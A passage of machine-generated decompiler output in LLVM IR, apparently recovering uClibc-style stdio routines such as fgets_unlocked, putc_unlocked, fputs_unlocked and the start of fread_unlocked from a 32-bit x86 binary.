  %v3_805c2ca = and i8 %v2_805c2ca, 64
  %v4_805c2ca = icmp eq i8 %v3_805c2ca, 0
  br i1 %v4_805c2ca, label %dec_label_pc_805c33f, label %dec_label_pc_805c2cf

dec_label_pc_805c2cf:                             ; preds = %dec_label_pc_805c2ca
  %v0_805c2cf = load i32, i32* @global_var_8073db0.705, align 16
  %v9_805c2cf = icmp eq i32 %v0_805c2cf, 2
  br i1 %v9_805c2cf, label %dec_label_pc_805c2f7, label %dec_label_pc_805c2d8

dec_label_pc_805c2d8:                             ; preds = %dec_label_pc_805c2cf
  %v1_805c2d8 = add i32 %v0_805c2d8, 56
  store i32 %v1_805c2d8, i32* @ebx, align 4
  %v5_805c2e7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 %v1_805c2d8)
  %v0_805c2ec = load i32, i32* @ebx, align 4
  %v2_805c2ef = call i32 @pthread_mutex_lock(i32 %v0_805c2ec)
  %v1_805c2f9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c2f7

dec_label_pc_805c2f7:                             ; preds = %dec_label_pc_805c2cf, %dec_label_pc_805c2d8
  %v0_805c309 = phi i32 [ %v0_805c2d8, %dec_label_pc_805c2cf ], [ %v1_805c2f9.pre, %dec_label_pc_805c2d8 ]
  %v0_805c2f7 = load i32, i32* @ebp, align 4
  %v2_805c2f9 = inttoptr i32 %v0_805c309 to i32*
  %v3_805c2f9 = load i32, i32* %v2_805c2f9, align 4
  %v4_805c2f9 = or i32 %v3_805c2f9, %v0_805c2f7
  %v2_805c2fb = urem i32 %v4_805c2f9, 65536
  %v9_805c2fb = and i32 %v2_805c2fb, 832
  %v2_805c2ff = icmp eq i32 %v9_805c2fb, 320
  %v1_805c304 = icmp eq i1 %v2_805c2ff, false
  br i1 %v1_805c304, label %dec_label_pc_805c325, label %dec_label_pc_805c306

dec_label_pc_805c306:                             ; preds = %dec_label_pc_805c2f7
  %v2_805c30a = call i32 @__stdio_wcommit(i32 %v0_805c309)
  %v1_805c312 = icmp eq i32 %v2_805c30a, 0
  br i1 %v1_805c312, label %dec_label_pc_805c31b, label %dec_label_pc_805c316

dec_label_pc_805c316:                             ; preds = %dec_label_pc_805c306
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805c325

dec_label_pc_805c31b:                             ; preds = %dec_label_pc_805c306
  %v0_805c31b = load i32, i32* @esi, align 4
  %v1_805c31b = inttoptr i32 %v0_805c31b to i16*
  %v2_805c31b = load i16, i16* %v1_805c31b, align 2
  %v3_805c31b = and i16 %v2_805c31b, -65
  store i16 %v3_805c31b, i16* %v1_805c31b, align 2
  %v0_805c31f = load i32, i32* @esi, align 4
  %v1_805c31f = add i32 %v0_805c31f, 8
  %v2_805c31f = inttoptr i32 %v1_805c31f to i32*
  %v3_805c31f = load i32, i32* %v2_805c31f, align 4
  %v2_805c322 = add i32 %v0_805c31f, 28
  %v3_805c322 = inttoptr i32 %v2_805c322 to i32*
  store i32 %v3_805c31f, i32* %v3_805c322, align 4
  br label %dec_label_pc_805c325

dec_label_pc_805c325:                             ; preds = %dec_label_pc_805c2f7, %dec_label_pc_805c316, %dec_label_pc_805c31b
  %v0_805c325 = load i32, i32* @global_var_8073db0.705, align 16
  %v9_805c325 = icmp eq i32 %v0_805c325, 2
  br i1 %v9_805c325, label %dec_label_pc_805c33f, label %dec_label_pc_805c32e

dec_label_pc_805c32e:                             ; preds = %dec_label_pc_805c325
  %v4_805c337 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805c33f

dec_label_pc_805c33f:                             ; preds = %dec_label_pc_805c325, %dec_label_pc_805c2ca, %dec_label_pc_805c32e
  %v0_805c33f = load i32, i32* @esi, align 4
  %v1_805c33f = add i32 %v0_805c33f, 32
  %v2_805c33f = inttoptr i32 %v1_805c33f to i32*
  %v3_805c33f = load i32, i32* %v2_805c33f, align 4
  store i32 %v3_805c33f, i32* @esi, align 4
  %v1_805c342 = icmp eq i32 %v3_805c33f, 0
  %v1_805c344 = icmp eq i1 %v1_805c342, false
  br i1 %v1_805c344, label %dec_label_pc_805c2ca, label %dec_label_pc_805c346

dec_label_pc_805c346:                             ; preds = %dec_label_pc_805c33f, %dec_label_pc_805c25e
  %v0_805c346 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_805c373

dec_label_pc_805c34d:                             ; preds = %dec_label_pc_805c251
  store i32 0, i32* @edi, align 4
  %tmp26 = bitcast i16* %arg1 to i8*
  %v3_805c34f = load i8, i8* %tmp26, align 1
  %v4_805c34f = and i8 %v3_805c34f, 64
  %v5_805c34f = icmp eq i8 %v4_805c34f, 0
  br i1 %v5_805c34f, label %dec_label_pc_805c373, label %dec_label_pc_805c354

dec_label_pc_805c354:                             ; preds = %dec_label_pc_805c34d
  store i32 -1, i32* @edi, align 4
  %v2_805c35b = call i32 @__stdio_wcommit(i32 %v4_805c245)
  %v1_805c363 = icmp eq i32 %v2_805c35b, 0
  %v1_805c365 = icmp eq i1 %v1_805c363, false
  br i1 %v1_805c365, label %dec_label_pc_805c373, label %dec_label_pc_805c367

dec_label_pc_805c367:                             ; preds = %dec_label_pc_805c354
  %v3_805c367 = load i16, i16* %arg1, align 2
  %v4_805c367 = and i16 %v3_805c367, -65
  store i16 %v4_805c367, i16* %arg1, align 2
  %v2_805c36b = add i32 %v4_805c245, 8
  %v3_805c36b = inttoptr i32 %v2_805c36b to i32*
  %v4_805c36b = load i32, i32* %v3_805c36b, align 4
  %v3_805c36e = add i32 %v4_805c245, 28
  %v4_805c36e = inttoptr i32 %v3_805c36e to i32*
  store i32 %v4_805c36b, i32* %v4_805c36e, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805c373

dec_label_pc_805c373:                             ; preds = %dec_label_pc_805c354, %dec_label_pc_805c34d, %dec_label_pc_805c346, %dec_label_pc_805c367
  %v0_805c376 = load i32, i32* @edi, align 4
  store i32 %v0_805c23f, i32* @ebx, align 4
  store i32 %v0_805c23e, i32* @esi, align 4
  store i32 %v0_805c23d, i32* @edi, align 4
  store i32 %v0_805c23c, i32* @ebp, align 4
  ret i32 %v0_805c376

; uselistorder directives
  uselistorder i32 %v3_805c33f, { 1, 2, 0 }
  uselistorder i32 %v4_805c245, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8073d80.729 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_807a688.719, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8073d98.718 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i32 134692220, { 1, 0 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805c373, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805c33f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c325, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c2f7, { 1, 0 }
  uselistorder label %dec_label_pc_805c2ca, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_805c380 = load i32, i32* @ebp, align 4
  %v0_805c381 = load i32, i32* @edi, align 4
  %v4_805c387 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c387, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805c387, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_805c3d1.preheader, label %dec_label_pc_805c3dd

dec_label_pc_805c3d1.preheader:                   ; preds = %entry
  %v1_805c3d119 = add i32 %arg2, -1
  %v8_805c3d123 = icmp eq i32 %v1_805c3d119, 0
  store i32 %v1_805c3d119, i32* @esi, align 4
  %v1_805c3d224 = icmp eq i1 %v8_805c3d123, false
  br i1 %v1_805c3d224, label %dec_label_pc_805c39b, label %dec_label_pc_805c3d4

dec_label_pc_805c39b:                             ; preds = %dec_label_pc_805c3d1.preheader, %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge.dec_label_pc_805c39b_crit_edge
  %v0_805c39b = phi i32 [ %v0_805c39b.pre, %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge.dec_label_pc_805c39b_crit_edge ], [ %arg3, %dec_label_pc_805c3d1.preheader ]
  %v1_805c39b = add i32 %v0_805c39b, 16
  %v2_805c39b = inttoptr i32 %v1_805c39b to i32*
  %v3_805c39b = load i32, i32* %v2_805c39b, align 4
  store i32 %v3_805c39b, i32* %eax.global-to-local, align 4
  %v2_805c39e = add i32 %v0_805c39b, 24
  %v3_805c39e = inttoptr i32 %v2_805c39e to i32*
  %v4_805c39e = load i32, i32* %v3_805c39e, align 4
  %v10_805c39e = icmp ult i32 %v3_805c39b, %v4_805c39e
  %v1_805c3a1 = icmp eq i1 %v10_805c39e, false
  br i1 %v1_805c3a1, label %dec_label_pc_805c3b1, label %dec_label_pc_805c3a3

dec_label_pc_805c3a3:                             ; preds = %dec_label_pc_805c39b
  %v1_805c3a3 = inttoptr i32 %v3_805c39b to i8*
  %v2_805c3a3 = load i8, i8* %v1_805c3a3, align 1
  %v3_805c3a3 = zext i8 %v2_805c3a3 to i32
  %v4_805c3a3 = load i32, i32* @edx, align 4
  %v5_805c3a3 = and i32 %v4_805c3a3, -256
  %v6_805c3a3 = or i32 %v5_805c3a3, %v3_805c3a3
  store i32 %v6_805c3a3, i32* @edx, align 4
  %v1_805c3a5 = add i32 %v3_805c39b, 1
  store i32 %v1_805c3a5, i32* %eax.global-to-local, align 4
  %v2_805c3a6 = load i32, i32* @ebx, align 4
  %v3_805c3a6 = inttoptr i32 %v2_805c3a6 to i8*
  store i8 %v2_805c3a3, i8* %v3_805c3a6, align 1
  %v0_805c3a8 = load i32, i32* @ebx, align 4
  %v1_805c3a8 = add i32 %v0_805c3a8, 1
  store i32 %v1_805c3a8, i32* @ebx, align 4
  %v0_805c3a9 = load i32, i32* @edx, align 4
  %v1_805c3a9 = trunc i32 %v0_805c3a9 to i8
  %v10_805c3a9 = icmp eq i8 %v1_805c3a9, 10
  %v0_805c3ac = load i32, i32* %eax.global-to-local, align 4
  %v1_805c3ac = load i32, i32* @ebp, align 4
  %v2_805c3ac = add i32 %v1_805c3ac, 16
  %v3_805c3ac = inttoptr i32 %v2_805c3ac to i32*
  store i32 %v0_805c3ac, i32* %v3_805c3ac, align 4
  br i1 %v10_805c3a9, label %dec_label_pc_805c3d4, label %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge

dec_label_pc_805c3b1:                             ; preds = %dec_label_pc_805c39b
  %v0_805c3b5 = call i32 @getc_unlocked()
  %v1_805c3b5 = trunc i32 %v0_805c3b5 to i8
  store i32 %v0_805c3b5, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_805c3b5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_805c3c0 = icmp eq i1 %tmp, false
  br i1 %v1_805c3c0, label %dec_label_pc_805c3cf, label %dec_label_pc_805c3c2

dec_label_pc_805c3c2:                             ; preds = %dec_label_pc_805c3b1
  %v0_805c3c2 = load i32, i32* @ebp, align 4
  %v1_805c3c2 = inttoptr i32 %v0_805c3c2 to i8*
  %v2_805c3c2 = load i8, i8* %v1_805c3c2, align 1
  %v3_805c3c2 = and i8 %v2_805c3c2, 8
  %v4_805c3c2 = icmp eq i8 %v3_805c3c2, 0
  br i1 %v4_805c3c2, label %dec_label_pc_805c3d4, label %dec_label_pc_805c3dd

dec_label_pc_805c3cf:                             ; preds = %dec_label_pc_805c3b1
  %v3_805c3ca = load i32, i32* @ebx, align 4
  %v4_805c3ca = inttoptr i32 %v3_805c3ca to i8*
  store i8 %v1_805c3b5, i8* %v4_805c3ca, align 1
  %v0_805c3cc = load i32, i32* @ebx, align 4
  %v1_805c3cc = add i32 %v0_805c3cc, 1
  store i32 %v1_805c3cc, i32* @ebx, align 4
  %v11_805c3cd = icmp eq i8 %v1_805c3b5, 10
  br i1 %v11_805c3cd, label %dec_label_pc_805c3d4, label %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge

dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge: ; preds = %dec_label_pc_805c3a3, %dec_label_pc_805c3cf
  %v0_805c3d1.pre = load i32, i32* @esi, align 4
  %v1_805c3d1 = add i32 %v0_805c3d1.pre, -1
  %v8_805c3d1 = icmp eq i32 %v1_805c3d1, 0
  store i32 %v1_805c3d1, i32* @esi, align 4
  %v1_805c3d2 = icmp eq i1 %v8_805c3d1, false
  br i1 %v1_805c3d2, label %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge.dec_label_pc_805c39b_crit_edge, label %dec_label_pc_805c3d4

dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge.dec_label_pc_805c39b_crit_edge: ; preds = %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge
  %v0_805c39b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805c39b

dec_label_pc_805c3d4:                             ; preds = %dec_label_pc_805c3d1.preheader, %dec_label_pc_805c3a3, %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge, %dec_label_pc_805c3cf, %dec_label_pc_805c3c2
  %v0_805c3d4 = load i32, i32* @ebx, align 4
  %v1_805c3d4 = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_805c3d4, %v1_805c3d4
  br i1 %tmp26, label %dec_label_pc_805c3d8, label %dec_label_pc_805c3dd

dec_label_pc_805c3d8:                             ; preds = %dec_label_pc_805c3d4
  %v1_805c3d8 = inttoptr i32 %v0_805c3d4 to i8*
  store i8 0, i8* %v1_805c3d8, align 1
  %v0_805c3e2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805c3df

dec_label_pc_805c3dd:                             ; preds = %dec_label_pc_805c3d4, %dec_label_pc_805c3c2, %entry
  br label %dec_label_pc_805c3df

dec_label_pc_805c3df:                             ; preds = %dec_label_pc_805c3d8, %dec_label_pc_805c3dd
  %v0_805c3e2 = phi i32 [ %v0_805c3e2.pre, %dec_label_pc_805c3d8 ], [ 0, %dec_label_pc_805c3dd ]
  store i32 %v0_805c3e2, i32* %eax.global-to-local, align 4
  store i32 %v0_805c381, i32* @edi, align 4
  store i32 %v0_805c380, i32* @ebp, align 4
  ret i32 %v0_805c3e2

; uselistorder directives
  uselistorder i32 %v0_805c3e2, { 1, 0 }
  uselistorder i32 %v0_805c3d4, { 1, 0 }
  uselistorder i32 %v1_805c3d1, { 1, 0 }
  uselistorder i32 %v0_805c3b5, { 0, 2, 1 }
  uselistorder i32 %v0_805c39b, { 1, 0 }
  uselistorder label %dec_label_pc_805c3df, { 1, 0 }
  uselistorder label %dec_label_pc_805c3d4, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805c3cf.dec_label_pc_805c3d1_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805c39b, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_805c3ec = load i32, i32* @esi, align 4
  %v0_805c3ed = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805c3f5 = sext i8 %arg1 to i32
  store i32 %v4_805c3f5, i32* @esi, align 4
  %v1_805c3f9 = add i32 %arg2, 16
  %v2_805c3f9 = inttoptr i32 %v1_805c3f9 to i32*
  %v3_805c3f9 = load i32, i32* %v2_805c3f9, align 4
  store i32 %v3_805c3f9, i32* %eax.global-to-local, align 4
  %v2_805c3fc = add i32 %arg2, 28
  %v3_805c3fc = inttoptr i32 %v2_805c3fc to i32*
  %v4_805c3fc = load i32, i32* %v3_805c3fc, align 4
  %v10_805c3fc = icmp ult i32 %v3_805c3f9, %v4_805c3fc
  %v1_805c3ff = icmp eq i1 %v10_805c3fc, false
  br i1 %v1_805c3ff, label %dec_label_pc_805c40e, label %dec_label_pc_805c401

dec_label_pc_805c401:                             ; preds = %entry
  store i32 %v4_805c3f5, i32* @edx, align 4
  %v3_805c403 = inttoptr i32 %v3_805c3f9 to i8*
  store i8 %arg1, i8* %v3_805c403, align 1
  %v0_805c405 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c405 = add i32 %v0_805c405, 1
  store i32 %v1_805c405, i32* %eax.global-to-local, align 4
  %v1_805c406 = load i32, i32* @ebx, align 4
  %v2_805c406 = add i32 %v1_805c406, 16
  %v3_805c406 = inttoptr i32 %v2_805c406 to i32*
  store i32 %v1_805c405, i32* %v3_805c406, align 4
  %v0_805c4a3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c4a3

dec_label_pc_805c40e:                             ; preds = %entry
  %v1_805c40e = inttoptr i32 %arg2 to i16*
  %v2_805c40e = load i16, i16* %v1_805c40e, align 2
  %v3_805c40e = zext i16 %v2_805c40e to i32
  %v1_805c411 = and i32 %v3_805c40e, 192
  store i32 %v1_805c411, i32* %eax.global-to-local, align 4
  %v6_805c416 = icmp eq i32 %v1_805c411, 192
  br i1 %v6_805c416, label %dec_label_pc_805c431, label %dec_label_pc_805c41d

dec_label_pc_805c41d:                             ; preds = %dec_label_pc_805c40e
  %v0_805c41d = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_805c41d, 16777216
  %v5_805c425 = sdiv i32 %sext, 16777216
  %v7_805c425 = call i32 @__stdio_trans2w_o(i16* %v1_805c40e, i32 128, i32 %v0_805c41d, i32 %v5_805c425)
  store i32 %v7_805c425, i32* %eax.global-to-local, align 4
  %v1_805c42d = icmp eq i32 %v7_805c425, 0
  %v1_805c42f = icmp eq i1 %v1_805c42d, false
  br i1 %v1_805c42f, label %dec_label_pc_805c4a8, label %dec_label_pc_805c41d.dec_label_pc_805c431_crit_edge

dec_label_pc_805c41d.dec_label_pc_805c431_crit_edge: ; preds = %dec_label_pc_805c41d
  %v0_805c431.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c431

dec_label_pc_805c431:                             ; preds = %dec_label_pc_805c41d.dec_label_pc_805c431_crit_edge, %dec_label_pc_805c40e
  %v0_805c494 = phi i32 [ %v0_805c431.pre, %dec_label_pc_805c41d.dec_label_pc_805c431_crit_edge ], [ %arg2, %dec_label_pc_805c40e ]
  %v1_805c431 = add i32 %v0_805c494, 4
  %v2_805c431 = inttoptr i32 %v1_805c431 to i32*
  %v3_805c431 = load i32, i32* %v2_805c431, align 4
  %v13_805c431 = icmp eq i32 %v3_805c431, -2
  %v1_805c435 = icmp eq i1 %v13_805c431, false
  br i1 %v1_805c435, label %dec_label_pc_805c43e, label %dec_label_pc_805c437

dec_label_pc_805c437:                             ; preds = %dec_label_pc_805c431
  %v0_805c437 = load i32, i32* @esi, align 4
  store i32 %v0_805c437, i32* @ecx, align 4
  %v1_805c439 = urem i32 %v0_805c437, 256
  store i32 %v1_805c439, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c4ab

dec_label_pc_805c43e:                             ; preds = %dec_label_pc_805c431
  %v1_805c43e = add i32 %v0_805c494, 12
  %v2_805c43e = inttoptr i32 %v1_805c43e to i32*
  %v3_805c43e = load i32, i32* %v2_805c43e, align 4
  store i32 %v3_805c43e, i32* %eax.global-to-local, align 4
  %v2_805c441 = add i32 %v0_805c494, 8
  %v3_805c441 = inttoptr i32 %v2_805c441 to i32*
  %v4_805c441 = load i32, i32* %v3_805c441, align 4
  %v15_805c441 = icmp eq i32 %v3_805c43e, %v4_805c441
  br i1 %v15_805c441, label %dec_label_pc_805c486, label %dec_label_pc_805c446

dec_label_pc_805c446:                             ; preds = %dec_label_pc_805c43e
  %v2_805c446 = add i32 %v0_805c494, 16
  %v3_805c446 = inttoptr i32 %v2_805c446 to i32*
  %v4_805c446 = load i32, i32* %v3_805c446, align 4
  %v15_805c446 = icmp eq i32 %v3_805c43e, %v4_805c446
  %v1_805c449 = icmp eq i1 %v15_805c446, false
  br i1 %v1_805c449, label %dec_label_pc_805c45b, label %dec_label_pc_805c44b

dec_label_pc_805c44b:                             ; preds = %dec_label_pc_805c446
  %v2_805c44f = call i32 @__stdio_wcommit(i32 %v0_805c494)
  store i32 %v2_805c44f, i32* %eax.global-to-local, align 4
  %v1_805c457 = icmp eq i32 %v2_805c44f, 0
  %v1_805c459 = icmp eq i1 %v1_805c457, false
  br i1 %v1_805c459, label %dec_label_pc_805c4a8, label %dec_label_pc_805c44b.dec_label_pc_805c45b_crit_edge

dec_label_pc_805c44b.dec_label_pc_805c45b_crit_edge: ; preds = %dec_label_pc_805c44b
  %v0_805c45b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c45b

dec_label_pc_805c45b:                             ; preds = %dec_label_pc_805c44b.dec_label_pc_805c45b_crit_edge, %dec_label_pc_805c446
  %v0_805c45b = phi i32 [ %v0_805c45b.pre, %dec_label_pc_805c44b.dec_label_pc_805c45b_crit_edge ], [ %v0_805c494, %dec_label_pc_805c446 ]
  %v1_805c45b = add i32 %v0_805c45b, 16
  %v2_805c45b = inttoptr i32 %v1_805c45b to i32*
  %v3_805c45b = load i32, i32* %v2_805c45b, align 4
  store i32 %v3_805c45b, i32* %eax.global-to-local, align 4
  %v0_805c45e = load i32, i32* @esi, align 4
  store i32 %v0_805c45e, i32* %edx.global-to-local, align 4
  %v1_805c460 = trunc i32 %v0_805c45e to i8
  %v3_805c460 = inttoptr i32 %v3_805c45b to i8*
  store i8 %v1_805c460, i8* %v3_805c460, align 1
  %v0_805c462 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c462 = add i32 %v0_805c462, 1
  store i32 %v1_805c462, i32* %eax.global-to-local, align 4
  %v1_805c463 = load i32, i32* @ebx, align 4
  %v2_805c463 = add i32 %v1_805c463, 16
  %v3_805c463 = inttoptr i32 %v2_805c463 to i32*
  store i32 %v1_805c462, i32* %v3_805c463, align 4
  %v0_805c466 = load i32, i32* @ebx, align 4
  %v1_805c466 = add i32 %v0_805c466, 1
  %v2_805c466 = inttoptr i32 %v1_805c466 to i8*
  %v3_805c466 = load i8, i8* %v2_805c466, align 1
  %v4_805c466 = urem i8 %v3_805c466, 2
  %v5_805c466 = icmp eq i8 %v4_805c466, 0
  br i1 %v5_805c466, label %dec_label_pc_805c4a1, label %dec_label_pc_805c46c

dec_label_pc_805c46c:                             ; preds = %dec_label_pc_805c45b
  %v0_805c46c = load i32, i32* %edx.global-to-local, align 4
  %v1_805c46c = trunc i32 %v0_805c46c to i8
  %v10_805c46c = icmp eq i8 %v1_805c46c, 10
  %v1_805c46f = icmp eq i1 %v10_805c46c, false
  br i1 %v1_805c46f, label %dec_label_pc_805c4a1, label %dec_label_pc_805c471

dec_label_pc_805c471:                             ; preds = %dec_label_pc_805c46c
  %v2_805c475 = call i32 @__stdio_wcommit(i32 %v0_805c466)
  store i32 %v2_805c475, i32* %eax.global-to-local, align 4
  %v1_805c47d = icmp eq i32 %v2_805c475, 0
  br i1 %v1_805c47d, label %dec_label_pc_805c4a1, label %dec_label_pc_805c481

dec_label_pc_805c481:                             ; preds = %dec_label_pc_805c471
  %v0_805c481 = load i32, i32* @ebx, align 4
  %v1_805c481 = add i32 %v0_805c481, 16
  %v2_805c481 = inttoptr i32 %v1_805c481 to i32*
  %v3_805c481 = load i32, i32* %v2_805c481, align 4
  %v4_805c481 = add i32 %v3_805c481, -1
  store i32 %v4_805c481, i32* %v2_805c481, align 4
  br label %dec_label_pc_805c4a8

dec_label_pc_805c486:                             ; preds = %dec_label_pc_805c43e
  %v0_805c486 = load i32, i32* @esi, align 4
  %v6_805c488 = trunc i32 %v0_805c486 to i8
  store i8 %v6_805c488, i8* %stack_var_-9, align 1
  %v2_805c48f = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_805c48f, i32* %eax.global-to-local, align 4
  %v5_805c494 = inttoptr i32 %v0_805c494 to i16*
  %sext10 = mul i32 %v0_805c486, 16777216
  %v5_805c495 = sdiv i32 %sext10, 16777216
  %v7_805c495 = call i32 @__stdio_WRITE(i16* %v5_805c494, i32 %v2_805c48f, i32 1, i32 %v5_805c495)
  store i32 %v7_805c495, i32* %eax.global-to-local, align 4
  %v1_805c49d = icmp eq i32 %v7_805c495, 0
  br i1 %v1_805c49d, label %dec_label_pc_805c4a8, label %dec_label_pc_805c4a1

dec_label_pc_805c4a1:                             ; preds = %dec_label_pc_805c486, %dec_label_pc_805c471, %dec_label_pc_805c46c, %dec_label_pc_805c45b
  %v0_805c4a1 = load i32, i32* @esi, align 4
  store i32 %v0_805c4a1, i32* @edx, align 4
  br label %dec_label_pc_805c4a3

dec_label_pc_805c4a3:                             ; preds = %dec_label_pc_805c401, %dec_label_pc_805c4a1
  %v0_805c4a3 = phi i32 [ %v0_805c4a3.pre, %dec_label_pc_805c401 ], [ %v0_805c4a1, %dec_label_pc_805c4a1 ]
  %v1_805c4a3 = urem i32 %v0_805c4a3, 256
  store i32 %v1_805c4a3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c4ab

dec_label_pc_805c4a8:                             ; preds = %dec_label_pc_805c486, %dec_label_pc_805c44b, %dec_label_pc_805c41d, %dec_label_pc_805c481
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c4ab

dec_label_pc_805c4ab:                             ; preds = %dec_label_pc_805c4a3, %dec_label_pc_805c437, %dec_label_pc_805c4a8
  %v0_805c4b0 = phi i32 [ %v1_805c4a3, %dec_label_pc_805c4a3 ], [ %v1_805c439, %dec_label_pc_805c437 ], [ -1, %dec_label_pc_805c4a8 ]
  store i32 %v0_805c3ed, i32* @ebx, align 4
  store i32 %v0_805c3ec, i32* @esi, align 4
  ret i32 %v0_805c4b0

; uselistorder directives
  uselistorder i32 %v1_805c4a3, { 1, 0 }
  uselistorder i32 %v1_805c439, { 1, 0 }
  uselistorder i32 %v0_805c494, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_805c41d, { 1, 0 }
  uselistorder label %dec_label_pc_805c4ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c4a8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_805c4a3, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c4b4 = load i32, i32* @esi, align 4
  %v0_805c4b5 = load i32, i32* @ebx, align 4
  store i32 %v0_805c4b5, i32* %stack_var_-8, align 4
  %v4_805c4b9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c4b9, i32* @ebx, align 4
  %v3_805c4be = call i32 @strlen(i8* %arg1)
  store i32 %v3_805c4be, i32* @esi, align 4
  %v0_805c4cf = load i32, i32* @ebx, align 4
  %v6_805c4d0 = call i32 @__GI_fwrite_unlocked(i32 %v0_805c4cf, i64 1, i32 %v3_805c4be, i32 %arg2)
  %v1_805c4db = load i32, i32* @esi, align 4
  %v12_805c4db = icmp eq i32 %v6_805c4d0, %v1_805c4db
  %v1_805c4dd = icmp eq i1 %v12_805c4db, false
  br i1 %v1_805c4dd, label %dec_label_pc_805c4e1, label %dec_label_pc_805c4df

dec_label_pc_805c4df:                             ; preds = %entry
  br label %dec_label_pc_805c4e1

dec_label_pc_805c4e1:                             ; preds = %entry, %dec_label_pc_805c4df
  %v0_805c4e1 = phi i32 [ -1, %entry ], [ %v6_805c4d0, %dec_label_pc_805c4df ]
  %v2_805c4e3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c4e3, i32* @edx, align 4
  %v2_805c4e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c4e4, i32* @ebx, align 4
  store i32 %v0_805c4b4, i32* @esi, align 4
  ret i32 %v0_805c4e1

; uselistorder directives
  uselistorder i32 %v6_805c4d0, { 1, 0 }
  uselistorder i32 (i32, i64, i32, i32)* @__GI_fwrite_unlocked, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805c4e1, { 1, 0 }
}

define i32 @__GI_fread_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i64 @__decompiler_undefined_function_4()
  %tmp32 = sext i32 %arg2 to i64
  %tmp35 = inttoptr i32 %arg4 to i16*
  %v0_805c4e8 = load i32, i32* @ebp, align 4
  %v0_805c4e9 = load i32, i32* @edi, align 4
  %v0_805c4ea = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v2_805c4f7 = load i16, i16* %tmp35, align 2
  %v3_805c4f7 = zext i16 %v2_805c4f7 to i32
  %v1_805c4fb = and i32 %v3_805c4f7, 131
  %v6_805c500 = icmp eq i32 %v1_805c4fb, 128
  store i1 %v6_805c500, i1* %zf.global-to-local, align 1
  %v6_805c505 = icmp ugt i32 %v1_805c4fb, 128
  br i1 %v6_805c505, label %dec_label_pc_805c51f, label %dec_label_pc_805c507

dec_label_pc_805c507:                             ; preds = %entry
  %v5_805c50f = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v0_805c4ea, i32 %v0_805c4ea)
